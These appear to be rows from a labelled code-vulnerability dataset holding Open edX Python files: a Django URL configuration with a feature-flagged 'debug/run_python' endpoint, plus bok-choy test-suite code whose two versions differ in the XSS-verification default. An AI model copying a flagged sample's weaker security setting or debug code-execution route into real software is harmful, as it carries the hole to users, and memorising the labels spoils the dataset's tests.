        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name=""courseware_section""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name=""courseware_position""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name=""progress""),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name=""student_progress""),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name=""instructor_dashboard""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name=""cohorts""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name=""add_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name=""list_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name=""add_to_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name=""remove_from_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name=""debug_cohort_mgmt""),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=""masquerade-switch""),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name=""news""),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name=""static_tab""),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=""foldit_ops""),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name=""hint_manager""),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'
/n/n/n",1
36,1162dbc18fda91b07a5942873387d60fd67b2cfc,"pavelib/paver_tests/test_paver_bok_choy_cmds.py/n/n""""""
Tests for the bok-choy paver commands themselves.
Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py
""""""
import os
import unittest

from mock import patch, call
from test.test_support import EnvironmentVarGuard
from paver.easy import BuildFailure
from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler

REPO_DIR = os.getcwd()


class TestPaverBokChoyCmd(unittest.TestCase):
    """"""
    Paver Bok Choy Command test cases
    """"""

    def _expected_command(self, name, store=None, verify_xss=True):
        """"""
        Returns the command that is expected to be run for the given test spec
        and store.
        """"""

        expected_statement = (
            ""DEFAULT_STORE={default_store} ""
            ""SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' ""
            ""BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' ""
            ""BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' ""
            ""SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' ""
            ""VERIFY_XSS='{verify_xss}' ""
            ""nosetests {repo_dir}/common/test/acceptance/{exp_text} ""
            ""--with-xunit ""
            ""--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml ""
            ""--verbosity=2 ""
        ).format(
            default_store=store,
            repo_dir=REPO_DIR,
            shard_str='/shard_' + self.shard if self.shard else '',
            exp_text=name,
            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',
            verify_xss=verify_xss
        )
        return expected_statement

    def setUp(self):
        super(TestPaverBokChoyCmd, self).setUp()
        self.shard = os.environ.get('SHARD')
        self.env_var_override = EnvironmentVarGuard()

    def test_default(self):
        suite = BokChoyTestSuite('')
        name = 'tests'
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_suite_spec(self):
        spec = 'test_foo.py'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_class_spec(self):
        spec = 'test_foo.py:FooTest'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_testcase_spec(self):
        spec = 'test_foo.py:FooTest.test_bar'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_spec_with_draft_default_store(self):
        spec = 'test_foo.py'
        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')
        name = 'tests/{}'.format(spec)
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=name, store='draft')
        )

    def test_invalid_default_store(self):
        # the cmd will dumbly compose whatever we pass in for the default_store
        suite = BokChoyTestSuite('', default_store='invalid')
        name = 'tests'
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=name, store='invalid')
        )

    def test_serversonly(self):
        suite = BokChoyTestSuite('', serversonly=True)
        self.assertEqual(suite.cmd, """")

    def test_verify_xss(self):
        suite = BokChoyTestSuite('', verify_xss=True)
        name = 'tests'
        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))

    def test_verify_xss_env_var(self):
        self.env_var_override.set('VERIFY_XSS', 'False')
        with self.env_var_override:
            suite = BokChoyTestSuite('')
            name = 'tests'
            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))

    def test_test_dir(self):
        test_dir = 'foo'
        suite = BokChoyTestSuite('', test_dir=test_dir)
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=test_dir)
        )

    def test_verbosity_settings_1_process(self):
        """"""
        Using 1 process means paver should ask for the traditional xunit plugin for plugin results
        """"""
        expected_verbosity_string = (
            ""--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2"".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else ''
            )
        )
        suite = BokChoyTestSuite('', num_processes=1)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_verbosity_settings_2_processes(self):
        """"""
        Using multiple processes means specific xunit, coloring, and process-related settings should
        be used.
        """"""
        process_count = 2
        expected_verbosity_string = (
            ""--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml""
            "" --processes={procs} --no-color --process-timeout=1200"".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else '',
                procs=process_count
            )
        )
        suite = BokChoyTestSuite('', num_processes=process_count)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_verbosity_settings_3_processes(self):
        """"""
        With the above test, validate that num_processes can be set to various values
        """"""
        process_count = 3
        expected_verbosity_string = (
            ""--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml""
            "" --processes={procs} --no-color --process-timeout=1200"".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else '',
                procs=process_count
            )
        )
        suite = BokChoyTestSuite('', num_processes=process_count)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_invalid_verbosity_and_processes(self):
        """"""
        If an invalid combination of verbosity and number of processors is passed in, a
        BuildFailure should be raised
        """"""
        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)
        with self.assertRaises(BuildFailure):
            BokChoyTestSuite.verbosity_processes_string(suite)


class TestPaverPa11yCrawlerCmd(unittest.TestCase):

    """"""
    Paver pa11ycrawler command test cases.  Most of the functionality is
    inherited from BokChoyTestSuite, so those tests aren't duplicated.
    """"""

    def setUp(self):
        super(TestPaverPa11yCrawlerCmd, self).setUp()

        # Mock shell commands
        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')
        self._mock_sh = mock_sh.start()

        # Cleanup mocks
        self.addCleanup(mock_sh.stop)

    def _expected_command(self, report_dir, start_urls):
        """"""
        Returns the expected command to run pa11ycrawler.
        """"""
        expected_statement = (
            'pa11ycrawler run {start_urls} '
            '--pa11ycrawler-allowed-domains=localhost '
            '--pa11ycrawler-reports-dir={report_dir} '
            '--pa11ycrawler-deny-url-matcher=logout '
            '--pa11y-reporter=""1.0-json"" '
            '--depth-limit=6 '
        ).format(
            start_urls=' '.join(start_urls),
            report_dir=report_dir,
        )
        return expected_statement

    def test_default(self):
        suite = Pa11yCrawler('')
        self.assertEqual(
            suite.cmd,
            self._expected_command(suite.pa11y_report_dir, suite.start_urls)
        )

    def test_get_test_course(self):
        suite = Pa11yCrawler('')
        suite.get_test_course()
        self._mock_sh.assert_has_calls([
            call(
                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),
            call(
                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),
        ])

    def test_generate_html_reports(self):
        suite = Pa11yCrawler('')
        suite.generate_html_reports()
        self._mock_sh.assert_has_calls([
            call(
                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),
        ])
/n/n/npavelib/utils/test/suites/bokchoy_suite.py/n/n""""""
Class used for defining and running Bok Choy acceptance test suite
""""""
from time import sleep
from urllib import urlencode

from common.test.acceptance.fixtures.course import CourseFixture, FixtureError

from path import Path as path
from paver.easy import sh, BuildFailure
from pavelib.utils.test.suites.suite import TestSuite
from pavelib.utils.envs import Env
from pavelib.utils.test import bokchoy_utils
from pavelib.utils.test import utils as test_utils

import os

try:
    from pygments.console import colorize
except ImportError:
    colorize = lambda color, text: text

__test__ = False  # do not collect

DEFAULT_NUM_PROCESSES = 1
DEFAULT_VERBOSITY = 2


class BokChoyTestSuite(TestSuite):
    """"""
    TestSuite for running Bok Choy tests
    Properties (below is a subset):
      test_dir - parent directory for tests
      log_dir - directory for test output
      report_dir - directory for reports (e.g., coverage) related to test execution
      xunit_report - directory for xunit-style output (xml)
      fasttest - when set, skip various set-up tasks (e.g., collectstatic)
      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C
      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment
      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.
      default_store - modulestore to use when running tests (split or draft)
      num_processes - number of processes or threads to use in tests. Recommendation is that this
      is less than or equal to the number of available processors.
      verify_xss - when set, check for XSS vulnerabilities in the page HTML.
      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html
    """"""
    def __init__(self, *args, **kwargs):
        super(BokChoyTestSuite, self).__init__(*args, **kwargs)
        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')
        self.log_dir = Env.BOK_CHOY_LOG_DIR
        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)
        self.xunit_report = self.report_dir / ""xunit.xml""
        self.cache = Env.BOK_CHOY_CACHE
        self.fasttest = kwargs.get('fasttest', False)
        self.serversonly = kwargs.get('serversonly', False)
        self.testsonly = kwargs.get('testsonly', False)
        self.test_spec = kwargs.get('test_spec', None)
        self.default_store = kwargs.get('default_store', None)
        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)
        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)
        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))
        self.extra_args = kwargs.get('extra_args', '')
        self.har_dir = self.log_dir / 'hars'
        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE
        self.imports_dir = kwargs.get('imports_dir', None)
        self.coveragerc = kwargs.get('coveragerc', None)
        self.save_screenshots = kwargs.get('save_screenshots', False)

    def __enter__(self):
        super(BokChoyTestSuite, self).__enter__()

        # Ensure that we have a directory to put logs and reports
        self.log_dir.makedirs_p()
        self.har_dir.makedirs_p()
        self.report_dir.makedirs_p()
        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter

        if not (self.fasttest or self.skip_clean or self.testsonly):
            test_utils.clean_test_files()

        msg = colorize('green', ""Checking for mongo, memchache, and mysql..."")
        print msg
        bokchoy_utils.check_services()

        if not self.testsonly:
            self.prepare_bokchoy_run()
        else:
            # load data in db_fixtures
            self.load_data()

        msg = colorize('green', ""Confirming servers have started..."")
        print msg
        bokchoy_utils.wait_for_test_servers()
        try:
            # Create course in order to seed forum data underneath. This is
            # a workaround for a race condition. The first time a course is created;
            # role permissions are set up for forums.
            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()
            print 'Forums permissions/roles data has been seeded'
        except FixtureError:
            # this means it's already been done
            pass

        if self.serversonly:
            self.run_servers_continuously()

    def __exit__(self, exc_type, exc_value, traceback):
        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)

        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)
        if self.testsonly:
            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')
            print msg
        else:
            # Clean up data we created in the databases
            msg = colorize('green', ""Cleaning up databases..."")
            print msg
            sh(""./manage.py lms --settings bok_choy flush --traceback --noinput"")
            bokchoy_utils.clear_mongo()

    def verbosity_processes_string(self):
        """"""
        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct
        the proper combination for use with nosetests.
        """"""
        substring = []

        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:
            msg = 'Cannot pass in both num_processors and verbosity. Quitting'
            raise BuildFailure(msg)

        if self.num_processes != 1:
            # Construct ""multiprocess"" nosetest substring
            substring = [
                ""--with-xunitmp --xunitmp-file={}"".format(self.xunit_report),
                ""--processes={}"".format(self.num_processes),
                ""--no-color --process-timeout=1200""
            ]

        else:
            substring = [
                ""--with-xunit"",
                ""--xunit-file={}"".format(self.xunit_report),
                ""--verbosity={}"".format(self.verbosity),
            ]

        return "" "".join(substring)

    def prepare_bokchoy_run(self):
        """"""
        Sets up and starts servers for a Bok Choy run. If --fasttest is not
        specified then static assets are collected
        """"""
        sh(""{}/scripts/reset-test-db.sh"".format(Env.REPO_ROOT))

        if not self.fasttest:
            self.generate_optimized_static_assets()

        # Clear any test data already in Mongo or MySQLand invalidate
        # the cache
        bokchoy_utils.clear_mongo()
        self.cache.flush_all()

        # load data in db_fixtures
        self.load_data()

        # load courses if self.imports_dir is set
        self.load_courses()

        # Ensure the test servers are available
        msg = colorize('green', ""Confirming servers are running..."")
        print msg
        bokchoy_utils.start_servers(self.default_store, self.coveragerc)

    def load_courses(self):
        """"""
        Loads courses from self.imports_dir.

        Note: self.imports_dir is the directory that contains the directories
        that have courses in them. For example, if the course is located in
        `test_root/courses/test-example-course/`, self.imports_dir should be
        `test_root/courses/`.
        """"""
        msg = colorize('green', ""Importing courses from {}..."".format(self.imports_dir))
        print msg

        if self.imports_dir:
            sh(
                ""DEFAULT_STORE={default_store}""
                "" ./manage.py cms --settings=bok_choy import {import_dir}"".format(
                    default_store=self.default_store,
                    import_dir=self.imports_dir
                )
            )

    def load_data(self):
        """"""
        Loads data into database from db_fixtures
        """"""
        print 'Loading data from json fixtures in db_fixtures directory'
        sh(
            ""DEFAULT_STORE={default_store}""
            "" ./manage.py lms --settings bok_choy loaddata --traceback""
            "" common/test/db_fixtures/*.json"".format(
                default_store=self.default_store,
            )
        )

    def run_servers_continuously(self):
        """"""
        Infinite loop. Servers will continue to run in the current session unless interrupted.
        """"""
        print 'Bok-choy servers running. Press Ctrl-C to exit...\n'
        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\n'

        while True:
            try:
                sleep(10000)
            except KeyboardInterrupt:
                print ""Stopping bok-choy servers.\n""
                break

    @property
    def cmd(self):
        """"""
        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,
         the command returns an empty string.
        """"""
        # Default to running all tests if no specific test is specified
        if not self.test_spec:
            test_spec = self.test_dir
        else:
            test_spec = self.test_dir / self.test_spec

        # Skip any additional commands (such as nosetests) if running in
        # servers only mode
        if self.serversonly:
            return """"

        # Construct the nosetests command, specifying where to save
        # screenshots and XUnit XML reports
        cmd = [
            ""DEFAULT_STORE={}"".format(self.default_store),
            ""SCREENSHOT_DIR='{}'"".format(self.log_dir),
            ""BOK_CHOY_HAR_DIR='{}'"".format(self.har_dir),
            ""BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'"".format(self.a11y_file),
            ""SELENIUM_DRIVER_LOG_DIR='{}'"".format(self.log_dir),
            ""VERIFY_XSS='{}'"".format(self.verify_xss),
            ""nosetests"",
            test_spec,
            ""{}"".format(self.verbosity_processes_string())
        ]
        if self.pdb:
            cmd.append(""--pdb"")
        if self.save_screenshots:
            cmd.append(""--with-save-baseline"")
        cmd.append(self.extra_args)

        cmd = ("" "").join(cmd)
        return cmd


class Pa11yCrawler(BokChoyTestSuite):
    """"""
    Sets up test environment with mega-course loaded, and runs pa11ycralwer
    against it.
    """"""

    def __init__(self, *args, **kwargs):
        super(Pa11yCrawler, self).__init__(*args, **kwargs)
        self.course_key = kwargs.get('course_key')
        if self.imports_dir:
            # If imports_dir has been specified, assume the files are
            # already there -- no need to fetch them from github. This
            # allows someome to crawl a different course. They are responsible
            # for putting it, un-archived, in the directory.
            self.should_fetch_course = False
        else:
            # Otherwise, obey `--skip-fetch` command and use the default
            # test course.  Note that the fetch will also be skipped when
            # using `--fast`.
            self.should_fetch_course = kwargs.get('should_fetch_course')
            self.imports_dir = path('test_root/courses/')

        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')
        self.tar_gz_file = ""https://github.com/edx/demo-test-course/archive/master.tar.gz""

        self.start_urls = []
        auto_auth_params = {
            ""redirect"": 'true',
            ""staff"": 'true',
            ""course_id"": self.course_key,
        }
        cms_params = urlencode(auto_auth_params)
        self.start_urls.append(""\""http://localhost:8031/auto_auth?{}\"""".format(cms_params))

        sequence_url = ""/api/courses/v1/blocks/?{}"".format(
            urlencode({
                ""course_id"": self.course_key,
                ""depth"": ""all"",
                ""all_blocks"": ""true"",
            })
        )
        auto_auth_params.update({'redirect_to': sequence_url})
        lms_params = urlencode(auto_auth_params)
        self.start_urls.append(""\""http://localhost:8003/auto_auth?{}\"""".format(lms_params))

    def __enter__(self):
        if self.should_fetch_course:
            self.get_test_course()
        super(Pa11yCrawler, self).__enter__()

    def get_test_course(self):
        """"""
        Fetches the test course.
        """"""
        self.imports_dir.makedirs_p()
        zipped_course = self.imports_dir + 'demo_course.tar.gz'

        msg = colorize('green', ""Fetching the test course from github..."")
        print msg

        sh(
            'wget {tar_gz_file} -O {zipped_course}'.format(
                tar_gz_file=self.tar_gz_file,
                zipped_course=zipped_course,
            )
        )

        msg = colorize('green', ""Uncompressing the test course..."")
        print msg

        sh(
            'tar zxf {zipped_course} -C {courses_dir}'.format(
                zipped_course=zipped_course,
                courses_dir=self.imports_dir,
            )
        )

    def generate_html_reports(self):
        """"""
        Runs pa11ycrawler json-to-html
        """"""
        cmd_str = (
            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'
        ).format(report_dir=self.pa11y_report_dir)

        sh(cmd_str)

    @property
    def cmd(self):
        """"""
        Runs pa11ycrawler as staff user against the test course.
        """"""
        cmd_str = (
            'pa11ycrawler run {start_urls} '
            '--pa11ycrawler-allowed-domains={allowed_domains} '
            '--pa11ycrawler-reports-dir={report_dir} '
            '--pa11ycrawler-deny-url-matcher={dont_go_here} '
            '--pa11y-reporter=""{reporter}"" '
            '--depth-limit={depth} '
        ).format(
            start_urls=' '.join(self.start_urls),
            allowed_domains='localhost',
            report_dir=self.pa11y_report_dir,
            reporter=""1.0-json"",
            dont_go_here=""logout"",
            depth=""6"",
        )
        return cmd_str
/n/n/n",0
37,1162dbc18fda91b07a5942873387d60fd67b2cfc,"/pavelib/paver_tests/test_paver_bok_choy_cmds.py/n/n""""""
Tests for the bok-choy paver commands themselves.
Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py
""""""
import os
import unittest

from mock import patch, call
from test.test_support import EnvironmentVarGuard
from paver.easy import BuildFailure
from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler

REPO_DIR = os.getcwd()


class TestPaverBokChoyCmd(unittest.TestCase):
    """"""
    Paver Bok Choy Command test cases
    """"""

    def _expected_command(self, name, store=None, verify_xss=False):
        """"""
        Returns the command that is expected to be run for the given test spec
        and store.
        """"""

        expected_statement = (
            ""DEFAULT_STORE={default_store} ""
            ""SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' ""
            ""BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' ""
            ""BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' ""
            ""SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' ""
            ""VERIFY_XSS='{verify_xss}' ""
            ""nosetests {repo_dir}/common/test/acceptance/{exp_text} ""
            ""--with-xunit ""
            ""--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml ""
            ""--verbosity=2 ""
        ).format(
            default_store=store,
            repo_dir=REPO_DIR,
            shard_str='/shard_' + self.shard if self.shard else '',
            exp_text=name,
            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',
            verify_xss=verify_xss
        )
        return expected_statement

    def setUp(self):
        super(TestPaverBokChoyCmd, self).setUp()
        self.shard = os.environ.get('SHARD')
        self.env_var_override = EnvironmentVarGuard()

    def test_default(self):
        suite = BokChoyTestSuite('')
        name = 'tests'
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_suite_spec(self):
        spec = 'test_foo.py'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_class_spec(self):
        spec = 'test_foo.py:FooTest'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_testcase_spec(self):
        spec = 'test_foo.py:FooTest.test_bar'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_spec_with_draft_default_store(self):
        spec = 'test_foo.py'
        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')
        name = 'tests/{}'.format(spec)
        self.assertEqual(
            suite.cmd,
